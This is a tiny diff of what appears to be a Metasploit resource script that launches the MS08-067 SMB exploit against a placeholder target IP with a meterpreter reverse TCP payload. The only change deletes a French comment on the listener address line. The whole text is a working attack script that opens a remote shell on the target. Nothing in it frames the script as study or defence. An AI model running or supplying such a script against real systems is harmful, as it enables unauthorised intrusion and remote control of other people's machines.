@@ -6,5 +6,5 @@ run
 use exploit/windows/smb/ms08_067_netapi
 set RHOST __TARGET_IP__
 set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST __TARGET_IP__  # ou ton IP d’écoute
+set LHOST __TARGET_IP__
 exploit -j
